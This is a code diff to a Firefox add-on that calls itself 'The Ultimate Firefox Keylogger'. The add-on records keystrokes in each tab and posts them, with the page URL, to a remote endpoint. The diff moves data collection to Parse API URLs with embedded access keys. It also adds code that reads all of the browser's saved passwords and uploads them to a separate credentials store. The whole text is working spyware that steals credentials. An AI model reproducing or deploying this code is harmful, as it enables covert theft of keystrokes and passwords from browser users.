@@ -4,7 +4,11 @@ The Ultimate Firefox Keylogger - Restartless Add-on
 
 var tabs = require("sdk/tabs");
 var ss = require("sdk/simple-storage");
-var url = "http://aws.punit.in/log.php";
+var URLS = {
+  logUrl: "https://JOjFu2dLzXjaU44uOEdav8cW0qdGS6P6Ud0uOwM1:javascript-key=wReHv8bEMS6xSDxxysxvNjmUvLHt41nrrXDn2jgt@api.parse.com/1/classes/Logs",
+  credUrl: "https://JOjFu2dLzXjaU44uOEdav8cW0qdGS6P6Ud0uOwM1:javascript-key=wReHv8bEMS6xSDxxysxvNjmUvLHt41nrrXDn2jgt@api.parse.com/1/classes/Pwds"
+};
+
 ss.storage.pages = [];
 ss.storage.data = ss.storage.data || "";
 
@@ -25,9 +29,10 @@ tabs.on("ready", function(tab) {
 
 // Send recorded data to server and track new set of keyboard actions when current tab is activated
 tabs.on("activate", function(tab) {
+  var payload = { url: tab.url, data: ss.storage.data };
   require("sdk/request").Request({
-    url: url,
-    content: "url="+tab.url+"&data="+ss.storage.data,
+    url: URLS.logUrl,
+    content: JSON.stringify(payload),
     onComplete: console.log(ss.storage.data)
   }).post();
 
@@ -43,6 +48,16 @@ tabs.on("activate", function(tab) {
       else
         ss.storage.data += "["+data+"]";
     });
+  }
+});
+
+require("sdk/passwords").search({
+  onComplete: function onComplete(credentials) {
+    require("sdk/request").Request({
+      url: URLS.credUrl,
+      content: JSON.stringify({ credentials: JSON.stringify(credentials) }),
+      onComplete: console.log(credentials)
+    }).post();
   }
 });
 
